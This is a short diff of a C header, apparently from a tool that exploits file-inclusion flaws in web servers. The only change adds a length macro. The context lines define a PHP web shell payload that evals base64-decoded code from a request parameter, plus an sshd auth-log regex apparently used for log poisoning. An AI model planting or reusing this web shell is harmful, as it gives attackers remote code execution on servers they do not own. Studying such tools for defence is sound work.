@@ -54,6 +54,8 @@ typedef struct {
 #define AUTH_LOG_REGEX "^(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s\\s?[1-3]?[0-9]\\s\\d+:\\d+:\\d+\\s.*\\ssshd\\[\\d+\\]:\\s.+$"
 #define STAIRWAY2HEAVEN "<?php eval(\"?>\".base64_decode($_REQUEST['stairway_to_heaven'])); exit(0); ?>"
 
+#define DATAWRAPLEN (sizeof(DATA_WRAP)-1)
+
 int is_dynamic(const char *url);
 int common_error_check(const char *uri);
 int disclosure_check(const char *uri, const char *xuri);
